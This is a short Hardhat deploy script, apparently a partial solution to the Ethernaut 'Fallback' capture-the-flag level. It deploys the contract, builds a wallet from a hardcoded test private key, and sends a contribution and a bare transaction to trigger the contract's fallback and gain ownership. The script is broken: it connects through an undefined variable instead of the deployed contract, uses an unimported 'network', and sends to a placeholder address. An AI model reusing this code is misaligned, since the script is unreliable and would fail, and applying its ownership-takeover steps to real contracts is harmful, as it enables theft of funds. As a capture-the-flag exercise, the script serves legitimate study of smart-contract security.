module.exports = async ({ getNamedAccounts, deployments }) => {
    const { deploy, log } = deployments
    const { deployer } = await getNamedAccounts()
    const chainId = network.config.chainId

    const fallback = await ethers.getContractFactory("Fallback")
    const myContract = await fallback.deploy()
    await myContract.deployed()

    const provider = ethers.provider
    const wlt = new ethers.Wallet(
        "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d",
        provider
    )
    let ethnCTF = await ethn.connect(wlt) // make a new contract connection with our reduced privileges

    // check we were able to contribute (send a transaction)
    await ethnCTF.contribute({ value: 1 })
    await ethnCTF.contributions("0x70997970C51812dc3A010C7d01b50e0d17dc79C8")

    let me = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"
    let tx = { to: "<contract address>", value: 1 }
    let promise = wlt.sendTransaction(tx)
}

module.exports.tags = ["all", "Fallback"]
